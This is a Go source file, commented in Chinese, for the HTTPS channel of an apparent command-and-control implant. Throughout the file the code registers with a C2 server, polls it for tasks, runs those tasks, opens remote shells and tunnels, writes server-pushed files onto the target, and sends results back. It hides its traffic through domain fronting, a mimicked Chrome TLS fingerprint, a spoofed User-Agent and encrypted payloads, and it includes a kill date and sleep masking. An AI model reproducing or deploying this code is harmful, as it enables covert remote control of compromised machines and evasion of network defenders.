//go:build transport_http

package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

// ─── HTTPS 轮询通道（域前置回连 + TLS 指纹拟态）──────────────────────
//
// 本文件仅在启用 HTTP 通道构建时编译（go build -tags transport_http，
// 由构建器按协议自动选择）。未启用时使用 transport_http_stub.go 的
// 空实现，避免把 net/http + crypto/tls 编进 TCP 专用的小体积植入端。
//
// HTTP 通道模型：
//   - 上行（implant → server）：所有上行帧（任务结果 / shell / 隧道 / 文件分片）
//     统一走 sendPacketSync，httpMode 下重定向到对应 HTTP 端点（/result /shell
//     /tunnel /file），与 TCP 通道共用一套业务逻辑；
//   - 下行（server → implant）：心跳响应携带 down 帧数组（base64 加密帧），
//     httpPollRun 解析后按帧类型分发（shell 指令 / 隧道 / 文件上传指令）。
//
// 流量拟态：
//   - 域前置：TLS SNI 与 HTTP Host 头伪装为 front_domain（合法 CDN 域名）；
//   - TLS 指纹（JA3）：使用 uTLS 把 ClientHello 伪装成真实 Chrome 指纹，
//     避免 Go 标准库 TLS 的典型指纹被 NDR/WAF 识别。
// 数据载荷复用 AES-GCM 加密 + TSHL 包格式，传输层无明文特征。

// httpMode 全局标记：true 时 sendPacketSync 走 HTTP POST（httpPollRun 设置）。
var httpMode bool

// ─── 会话令牌（审计 M2）──────────────────────────────────────────────────
// 服务端在注册响应里下发 session_token；之后所有按 session_id 拉数据的
// GET（/task 以及同类端点）都必须带 token=<...>，否则服务端一律 403。
//
// 只存内存：重连/重新注册会拿到新令牌（服务端每次注册都覆盖），旧令牌立即
// 失效。令牌为空时也照样拼 token= —— 服务端必须拒绝空令牌，客户端不能
// fail-open（"没有令牌就不带、服务端当匿名放行"是最坏的兼容方向）。
var (
	httpTokenMu      sync.RWMutex
	httpSessionToken string
)

func setHTTPSessionToken(token string) {
	httpTokenMu.Lock()
	httpSessionToken = token
	httpTokenMu.Unlock()
}

func getHTTPSessionToken() string {
	httpTokenMu.RLock()
	defer httpTokenMu.RUnlock()
	return httpSessionToken
}

// isSessionAuthPath 判断某端点是否属于"用 session_id 鉴权、必须带会话令牌"
// 的拉取端点（/task 以及后续可能新增的同类 GET）。
func isSessionAuthPath(path string) bool {
	base := path
	if i := strings.IndexByte(base, '?'); i >= 0 {
		base = base[:i]
	}
	base = strings.TrimSuffix(base, "/")
	return base == "task" || strings.HasSuffix(base, "/task")
}

// httpAuthPath 给需要会话令牌的端点追加 token 查询参数（保留已有查询串）。
func httpAuthPath(path string) string {
	if !isSessionAuthPath(path) {
		return path
	}
	sep := "?"
	if strings.Contains(path, "?") {
		sep = "&"
	}
	return path + sep + "token=" + url.QueryEscape(getHTTPSessionToken())
}

// httpSharedClient 返回复用的 HTTP 客户端（连接池，SNI 使用拟态域名）。
// 实现按 build 标签二选一（transport_tls_std.go / transport_tls_utls.go）：
//   - transport_http + light  → 标准库 crypto/tls（体积小约 3MB）
//   - transport_http + !light → uTLS Chrome JA3 指纹拟态

// isHTTPTransport 判断 serverAddr 是否为 HTTP(S) 轮询通道。
func isHTTPTransport(s string) bool {
	t := strings.TrimSpace(s)
	return strings.HasPrefix(t, "https://") || strings.HasPrefix(t, "http://")
}

// isWSTransport stub：HTTP 构建不含 WebSocket 通道，恒 false
// （transport_ws.go 带 transport_ws 标签，http 构建不编译，此处满足 main.go 引用）。
func isWSTransport(s string) bool { return false }

// isMQTTTransport stub：HTTP 构建不含 MQTT 通道，恒 false。
func isMQTTTransport(s string) bool { return false }

// wsPollRun stub：HTTP 构建不含 WebSocket 通道。
func wsPollRun() {}

// mqttPollRun stub：HTTP 构建不含 MQTT 通道。
func mqttPollRun() {}

// httpBaseURL 规范化 HTTP 通道基础 URL（去除尾部路径，保证以 / 结尾）。
func httpBaseURL(s string) string {
	t := strings.TrimSpace(s)
	if !strings.HasPrefix(t, "https://") && !strings.HasPrefix(t, "http://") {
		t = "https://" + t
	}
	if u, err := url.Parse(t); err == nil {
		u.Path = ""
		u.RawQuery = ""
		return strings.TrimRight(u.String(), "/") + "/"
	}
	return strings.TrimRight(t, "/") + "/"
}

// httpC2Request 向 C2 发送一个加密包并解析响应包。
// body = AES-GCM(compress(encodePacket(p)))；响应 body 同格式，parsePacket 内部解密密文。
func httpC2Request(client *http.Client, base, path string, p *Packet) (*Packet, error) {
	raw := encodePacket(p)
	cmp, err := compress(raw)
	if err != nil {
		return nil, err
	}
	body, err := encrypt(cmp)
	if err != nil {
		return nil, err
	}

	// 审计 M2：按 session_id 拉数据的端点（/task 等）统一在此追加会话令牌，
	// 避免将来新增调用点漏带 token。
	path = httpAuthPath(path)
	req, err := http.NewRequest("POST", base+path, bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	// 域前置：HTTP Host 头伪装为合法域名（若配置了 front_domain）。
	if frontDomain != "" {
		req.Host = frontDomain
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "*/*")

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("http status %d", resp.StatusCode)
	}
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	if len(respBody) == 0 {
		return nil, fmt.Errorf("empty response")
	}
	return parsePacket(respBody)
}

// httpSendFrame 将上行帧通过 HTTP POST 发送到对应端点（HTTP 通道模式）。
// 由 sendPacketSync 在 httpMode 时调用，所有业务上行（结果/shell/隧道/文件）共用。
// 上行端点（/result /shell /tunnel /file）返回明文 {"status":"ok"}（拟态更自然），
// 因此这里只校验 HTTP 200，不解析响应体——避免把"发送成功"误判为失败。
func httpSendFrame(p *Packet) bool {
	if p == nil {
		return false
	}
	path := "result"
	switch p.Type {
	case TypeResult:
		path = "result"
	case TypeShellOpen, TypeShellData, TypeShellClose:
		path = "shell"
	case TypeTunnel:
		path = "tunnel"
	case TypeFileUp, TypeFileDown:
		path = "file"
	}
	raw := encodePacket(p)
	cmp, err := compress(raw)
	if err != nil {
		return false
	}
	body, err := encrypt(cmp)
	if err != nil {
		return false
	}
	req, err := http.NewRequest("POST", httpBaseURL(serverAddr)+path, bytes.NewReader(body))
	if err != nil {
		return false
	}
	if frontDomain != "" {
		req.Host = frontDomain
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "*/*")
	resp, err := httpSharedClient().Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	_, _ = io.Copy(io.Discard, resp.Body)
	return resp.StatusCode == http.StatusOK
}

// httpPullFileChunk 从服务端拉取指定上传任务的一个分片（文件上传到目标机方向）。
func httpPullFileChunk(uploadID string, offset, length int64) []byte {
	req := &struct {
		UploadID string `json:"upload_id"`
		Offset   int64  `json:"offset"`
		Length   int64  `json:"length"`
	}{uploadID, offset, length}
	payload, _ := json.Marshal(req)
	p := &Packet{
		Magic:     [4]byte{Magic0, Magic1, Magic2, Magic3},
		Version:   Version,
		Type:      TypeFileDown,
		ID:        sessionID,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   payload,
	}
	ack, err := httpC2Request(httpSharedClient(), httpBaseURL(serverAddr), "file/pull", p)
	if err != nil || ack == nil {
		return nil
	}
	var resp struct {
		Data string `json:"data"` // base64
	}
	if json.Unmarshal(ack.Payload, &resp) != nil {
		return nil
	}
	data, _ := base64.StdEncoding.DecodeString(resp.Data)
	return data
}

// httpUploadFile 以"拉取"方式把服务端暂存文件写入目标机路径（HTTP 通道）。
// 服务端 PushFileUpload 已把文件分片落盘 data/uploads/<session>/<uploadID>，
// 本函数按 offset 循环拉取并写入 chunk.Path，拉满 size 后回传结果。
func httpUploadFile(chunk struct {
	UploadID string `json:"upload_id"`
	TaskID   uint64 `json:"task_id"`
	Filename string `json:"filename"`
	Path     string `json:"path"`
	Size     int64  `json:"size"`
	Offset   int64  `json:"offset"`
	Done     bool   `json:"done"`
	Data     string `json:"data"`
}) {
	if chunk.Path == "" || chunk.Size < 0 {
		return
	}
	if dir := filepath.Dir(chunk.Path); dir != "" && dir != "." {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			sendUpResult(chunk.TaskID, -1, "", "mkdir failed: "+err.Error())
			return
		}
	}
	f, err := os.OpenFile(chunk.Path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o644)
	if err != nil {
		sendUpResult(chunk.TaskID, -1, "", "create failed: "+err.Error())
		return
	}
	defer f.Close()

	const chunkSize = 256 * 1024
	var received int64
	for received < chunk.Size {
		need := chunk.Size - received
		if need > chunkSize {
			need = chunkSize
		}
		data := httpPullFileChunk(chunk.UploadID, received, need)
		if len(data) == 0 {
			sendUpResult(chunk.TaskID, -1, "", fmt.Sprintf("pull failed at offset %d", received))
			return
		}
		if _, err := f.WriteAt(data, received); err != nil {
			sendUpResult(chunk.TaskID, -1, "", "write failed: "+err.Error())
			return
		}
		received += int64(len(data))
	}
	_ = f.Sync()
	sendUpResult(chunk.TaskID, 0, fmt.Sprintf("uploaded %d bytes to %s", received, chunk.Path), "")
}

// dispatchDown 处理心跳响应携带的下行帧（shell 指令 / 隧道 / 文件上传指令）。
func dispatchDown(p *Packet) {
	if p == nil {
		return
	}
	switch p.Type {
	case TypeShellOpen:
		handleShellOpen(p)
	case TypeShellData:
		handleShellData(p)
	case TypeShellClose:
		handleShellClose()
	case TypeTunnel:
		processTunnelRaw(p.Payload)
	case TypeFileUp:
		if httpMode {
			var chunk struct {
				UploadID string `json:"upload_id"`
				TaskID   uint64 `json:"task_id"`
				Filename string `json:"filename"`
				Path     string `json:"path"`
				Size     int64  `json:"size"`
				Offset   int64  `json:"offset"`
				Done     bool   `json:"done"`
				Data     string `json:"data"`
			}
			if json.Unmarshal(p.Payload, &chunk) == nil {
				go httpUploadFile(chunk)
			}
		} else {
			handleFileUp(p)
		}
	case TypeTask:
		// 下行任务帧（极少用）：直接执行并回传结果
		var task Task
		if json.Unmarshal(p.Payload, &task) == nil {
			result := executeTask(task)
			resultPayload, _ := json.Marshal(result)
			rp := &Packet{
				Magic:     [4]byte{Magic0, Magic1, Magic2, Magic3},
				Version:   Version,
				Type:      TypeResult,
				ID:        sessionID,
				Timestamp: uint64(time.Now().UnixMilli()),
				Payload:   resultPayload,
			}
			httpSendFrame(rp)
		}
	case TypeModuleData:
		// v1.4.0 S4：内存模块二进制帧。HTTP 轮询通道里它随心跳响应的 down 列表到达，
		// 而任务在同一次响应里（down 先于 tasks 处理，见 httpPollRun），因此任务执行时
		// 二进制通常已经在暂存表里。
		handleXData(p)
	}
}

// httpPollRun HTTPS 轮询主循环：注册 → 轮询心跳（拉任务与下行帧）→ 执行 → 结果回传。
// 任何失败直接返回，由主循环按指数退避后重连（与 TCP 通道一致）。
func httpPollRun() {
	httpMode = true
	client := httpSharedClient()
	base := httpBaseURL(serverAddr)

	// 注册（失败即返回，等待主循环重连）
	ack, err := httpC2Request(client, base, "register", buildRegisterPacket())
	if err != nil {
		return
	}
	// 审计 M2：保存注册响应下发的会话令牌，之后 /task 拉取必须带上。
	// 服务端每次注册都会覆盖旧令牌，因此重连后以最新响应为准。
	if ack != nil && len(ack.Payload) > 0 {
		var regResp struct {
			Status       string `json:"status"`
			SessionToken string `json:"session_token"`
		}
		if json.Unmarshal(ack.Payload, &regResp) == nil && regResp.SessionToken != "" {
			setHTTPSessionToken(regResp.SessionToken)
		}
	}

	hbInterval := jitteredInterval(interval)
	// 首次心跳立即发出（与 TCP 主循环一致）：能力位只随心跳上报，拖一个完整心跳间隔
	// 会让控制台先用 OS 兜底清单渲染操作面板。
	lastHeartbeat := time.Now().Add(-hbInterval)
	for {
		if killDateReached() {
			os.Exit(0)
		}
		if workHoursValid && !inWorkingHours() {
			// 非工作时段：最长的一个空闲窗口，加密敏感内存后再睡（见 sleepmask_*.go）
			maskedSleep(5 * time.Minute)
			continue
		}

		if time.Since(lastHeartbeat) < hbInterval {
			time.Sleep(2 * time.Second)
			continue
		}

		hbPacket := &Packet{
			Magic:     [4]byte{Magic0, Magic1, Magic2, Magic3},
			Version:   Version,
			Type:      TypeHeartbeat,
			ID:        sessionID,
			Timestamp: uint64(time.Now().UnixMilli()),
			Payload:   heartbeatPayload,
		}
		ack, err := httpC2Request(client, base, "heartbeat", hbPacket)
		if err != nil {
			return // 心跳失败 → 重连
		}
		lastHeartbeat = time.Now()
		hbInterval = jitteredInterval(interval)

		if ack == nil {
			continue
		}

		// 解析服务端 ACK：{"status":"ok","has_task":true,"task":{...},"tasks":[{...}],"down":["b64帧"...]}
		var hb struct {
			Status  string   `json:"status"`
			HasTask bool     `json:"has_task"`
			Task    *Task    `json:"task"`
			Tasks   []Task   `json:"tasks"`
			Down    []string `json:"down"`
		}
		if json.Unmarshal(ack.Payload, &hb) != nil {
			continue
		}

		// 处理下行帧（shell / 隧道 / 文件上传指令）
		for _, b64f := range hb.Down {
			raw, derr := base64.StdEncoding.DecodeString(b64f)
			if derr != nil {
				continue
			}
			if p, perr := parsePacket(raw); perr == nil && p != nil {
				dispatchDown(p)
			}
		}

		// 批量任务：优先取 tasks 数组（新协议），兼容单任务 task 字段。
		// 逐个执行并同步回传结果，避免多任务排队数分钟。
		queue := hb.Tasks
		if len(queue) == 0 && hb.HasTask && hb.Task != nil {
			queue = []Task{*hb.Task}
		}
		for _, t := range queue {
			result := executeTask(t)
			resultPayload, _ := json.Marshal(result)
			rp := &Packet{
				Magic:     [4]byte{Magic0, Magic1, Magic2, Magic3},
				Version:   Version,
				Type:      TypeResult,
				ID:        sessionID,
				Timestamp: uint64(time.Now().UnixMilli()),
				Payload:   resultPayload,
			}
			// 结果回传失败不致命：服务端会在下次心跳重新下发任务（任务幂等）。
			httpSendFrame(rp)

			// exit 任务：结果已回传，植入端退出
			if exitRequested.Load() {
				time.Sleep(200 * time.Millisecond)
				os.Exit(0)
			}
		}
	}
}
